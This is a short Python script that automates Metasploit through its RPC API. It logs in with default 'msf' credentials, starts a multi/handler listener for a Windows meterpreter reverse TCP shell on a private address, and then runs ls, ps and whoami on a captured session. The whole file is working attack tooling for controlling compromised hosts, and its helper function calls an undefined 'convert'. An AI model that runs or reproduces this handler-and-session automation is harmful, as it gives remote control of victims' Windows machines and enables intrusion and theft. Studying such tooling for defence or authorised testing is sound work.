# _*_ encoding:utf-8 _*_
# __author__ = "dr0op"

from pymsfrpc import MsfRpcClient
import time

ip = "10.10.11.180"
port = "55553"
user = "msf"
passwd = "msf"
c = MsfRpcClient.Client(ip,port,user,passwd)


def dictdecode(data):
    if isinstance(data, bytes):  return data.decode('ascii')
    if isinstance(data, dict):   return dict(map(convert, data.items()))
    if isinstance(data, tuple):  return map(convert, data)
    return data

console_id = c.create_console().get(b'id')
print("consoleID:",console_id)
print("list",c.list_consoles())

cmd = """
        use exploit/multi/handler
        set PAYLOAD windows/meterpreter/reverse_tcp
        set LHOST 10.10.11.180
        set LPORT 3355
        exploit -z -j
      """

res = c.get_version()
resp = c.write_console(console_id,cmd)
print(resp)

time.sleep(1)
while True:
    res = c.read_console(console_id)
    if res[b'busy'] == True:
        time.sleep(1)
        continue
    elif res[b'busy'] == False:
        print(res[b'data'].decode())
        break

print("sessions:",c.list_sessions())
print("pro_moudles:",c.send_command(["pro.modules",c.token,"post"]))
print("meterpreter_run_single:",c.send_command(["session.meterpreter_run_single",c.token,2,"ls"]))
print("meterpreter_script:",c.send_command(["session.meterpreter_script",c.token,2,"ps"]))
#print("write_shell:",c.write_shell(1,"info"))
print("read_shell:",c.read_shell(2))
print("write meterpreter",c.write_meterpreter(2,'whoami\n'))
print("read meterpreter",c.read_meterpreter(2))


print(c.destroy_console(console_id))